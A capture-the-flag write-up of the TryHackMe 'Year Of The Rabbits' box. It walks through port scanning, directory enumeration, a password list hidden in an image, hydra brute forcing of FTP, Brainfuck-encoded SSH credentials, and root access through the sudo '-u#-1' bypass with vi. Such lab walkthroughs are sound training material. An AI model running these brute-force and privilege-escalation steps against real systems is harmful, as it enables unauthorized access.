---
title: Year Of The Rabbits
categories: [writeups,TryHackMe]
tags: [b2r,Linux,Privilege-Escalation,Steganography,Sudo-Exploit]
# date: 13/07/2022
---
# Year Of The Rabbits 
- Difficulty : `easy`
- Series : `New Year Series`
- Operating System : `Linux`

# Table of Content
- [Year Of The Rabbits](#year-of-the-rabbits)
- [Table of Content](#table-of-content)
  - [Nmap Result](#nmap-result)
- [Method to solve the challenge](#method-to-solve-the-challenge)
- [Privilege Escalation](#privilege-escalation)

# Nmap Result
```
Nmap scan report for 10.10.13.237
Host is up, received syn-ack (0.33s latency).
Scanned at 2022-07-15 08:38:52 UTC for 20s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
22/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8=
|   256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh
80/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# Method to solve the challenge
As usual, we will start with website after checking for each version and confirmed that they are not vulnerable.
<br>
![](/assets/img/posts/2022-07-15-Year-Of-The-Rabbits-1.png) 
<br>
The website is just a normal default page. Since there are nothing much to search, we will be using `gobuster` to search for subdirectories in the website.
```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.13.237         
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.13.237
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/15 04:38:55 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.13.237/assets/]
/index.html           (Status: 200) [Size: 7853]                                 
/server-status        (Status: 403) [Size: 277]                                  
                                                                                 
===============================================================
2022/07/15 04:41:32 Finished
===============================================================
```
Based on the result, `/assets/` seems to be only tip which might allow us to continue our challenge. 
<br>
![](/assets/img/posts/2022-07-15-Year-Of-The-Rabbits-2.png)
<br>
The mp4 file is really RickRolled and therefore we are only able to continue with the CSS file. 
<br>
![](/assets/img/posts/2022-07-15-Year-Of-The-Rabbits-3.png)
<br>
Inside the CSS file, there is our next tip which is giving us a hidden file named `/sup3r_s3cr3t_fl4g.php`. When we redirect to the file, it pop ups a message as below and we got rick rolled again! 
<br>
![](/assets/img/posts/2022-07-15-Year-Of-The-Rabbits-4.png) 
<br>
Since it asked us to turn off javascript, we can either use `burpsuite` or `curl` to look for our next tips.
```
curl -IR 10.10.13.237/sup3r_s3cr3t_fl4g.php

HTTP/1.1 302 Found
Date: Fri, 15 Jul 2022 08:55:48 GMT
Server: Apache/2.4.10 (Debian)
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
Content-Type: text/html; charset=UTF-8
```
Our next tips was another hidden directory which is `/WExYY2Cv-qU`. When we redirect into the hidden directory, it was only a image there.
<br>
![](/assets/img/posts/2022-07-15-Year-Of-The-Rabbits-5.png)
<br>
Since we have no other clue, the image might have some clues since there are a lot of CTF out there which hide data inside images. After exploring with the image, there is a wonderful tip for us to proceed with our next session which is FTP.

```
strings Hot_Babe.png
...<many random strings>
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

Inside the image file, there is a sentence which told us that the username of ftp is `ftpuser` and the password is within the list given. We now can brute force ftp with the given username and password list.

```
hydra -l ftpuser -P pass.txt 10.10.13.237 ftp
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-15 05:04:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.13.237:21/
[21][ftp] host: 10.10.13.237   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-15 05:04:41
```

We now have our FTP credentials `ftpuser:5iez1wGXKfPKQ` cand we can proceed with FTP to look for other tips. There is only 1 file inside the ftp server. We are not able to read the file but we are able to download the whole file from ftp server.

```
cat Eli\'s_Creds.txt                       
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
After downloading the file and view the data inside, we saw some weird character which is not human language. Luckily, there is a [online tool](https://www.dcode.fr/cipher-identifier) out there which could help us to identify that is this and the content inside.
<br>
![](/assets/img/posts/2022-07-15-Year-Of-The-Rabbits-6.png)
<br>
![](/assets/img/posts/2022-07-15-Year-Of-The-Rabbits-7.png)
<br>
The content was huge as it gave us the credentials. The credentials was use to get shell from ssh but it is not a root account and we will need to perform privilege escalation.

# Privilege Escalation
```

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```
When we first login into the ssh, there is a message asking us to check the `s3cr3t` directory. we could use `find/ -name s3cr3t` to search for every directory and look for the directory that we needed.
```
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
eli@year-of-the-rabbit:/usr/games/s3cr3t$ 
```
There is only 1 file inside the directory but the content of the file allow us to change from user `eli` to user `gwendoline`. After changing user to `gwendoline`, we only have a clue which seems to be the only method to continue.
```
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
Based on the content above, we are allow to run every user in the system except root when we are using `vi` for `/home/gwendoline/user.txt`. We are basically stuck here as all we wanted was running vi as root so we can get shell from it. Since we are stuck here, we can use some of the [privilege escalation script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) out there.
```
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
```
After looking for quite some time, the sudo version was surprising me as it seems to have a useful [exploit](https://www.exploit-db.com/exploits/47502) on that version which might help us to get root privilege.
<br> `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt` in terminal
<br> `:shell` in vi mode
<br>
```
root@year-of-the-rabbit:/usr/games/s3cr3t# id
uid=0(root) gid=0(root) groups=0(root)
```
We manage to get root account! The reason behind this exploit is that version of `sudo` somehow read `-u#-1` as `-u#0` and `0` is also the uid for root.
